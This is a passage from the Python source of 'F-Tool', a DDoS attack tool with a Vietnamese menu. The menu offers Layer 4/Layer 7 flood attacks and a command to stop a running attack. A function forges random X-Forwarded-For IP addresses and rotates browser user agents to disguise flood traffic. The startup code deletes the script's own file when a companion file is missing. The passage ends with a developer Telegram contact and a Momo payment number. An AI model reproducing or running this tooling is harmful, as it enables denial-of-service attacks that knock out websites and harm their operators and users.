			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Cuộc tấn công đã dừng lại!")
			elif option in ['00', '0']:
				os.system('clear');self.bbos()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")

def soon():
	pass

def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3519.53 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3533.161 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Herring/93.1.8770.71',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 OPR/83.0.4254.27',
	'Mozilla/5.0 (Linux; Android 10; CPH1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.26 Mobile Safari/537.36']

	return {
	'Connection': 'Keep-Alive',
	'Cache-control': 'no-cache',
	'User-Agent': random.choice(useragents).strip(),
	'X-Forwarded-For': random.choice(spoof_ip)
	}

def main():
	#  kiểm tra xem bạn có phải là gay không 😏
	F_Tool.styleText("[+] Kiểm tra phụ thuộc...\n\n")
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		if ur_mom == None:
			F_Tool.styleText(f"[!] {pkg} không được cài đặt!\n")
			install = False
		else:
			pass
	if install == False:
		sys.exit(f'\n[?] Lỗi? thử:{Color.LG} sh install.sh')
	else:pass
	try:
		script = True
		with open('utils') as important:pass
	except IsADirectoryError:pass
	except FileNotFoundError:
		print(f"{Color.LR}[CRITICAL LỖI]:{Color.RESET} File: 'utils' Không tìm thấy")
		print("\n[+] Vui lòng tải xuống trên GitHub, hoặc git clone https://github.com/DauDau432/F-Tool\n")
		os.remove(f'{__file__}')
		script = False
	if script == False:sys.exit()
	else:F_Tool.home()


if __name__ == '__main__':
	commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Trở về home
{Color.LC}REF{Color.LR} ~> {Color.LY}Làm mới menu
{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Xóa màn hình
{Color.LC}EXIT{Color.LR} ~> {Color.LY}Thoát khỏi chương trình
{Color.LC}BBOS{Color.LR} ~> {Color.LY}Tấn công DDOS L4/L7
{Color.LC}STOP{Color.LR} ~> {Color.LY}Dừng cuộc tấn công của bạn
{Color.LC}DEV{Color.LR} ~> {Color.LY}Liên hệ / Hỗ trợ nhà phát triển"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/Daukute
{Color.LC}Momo{Color.LR}: {Color.LY}0983538806"""
	F_Tool = Home(commands, dev)
	Tool = Tool(commands, dev, spoof_useragents())
	try:open('F-Tool.py');main()
	except:quit()
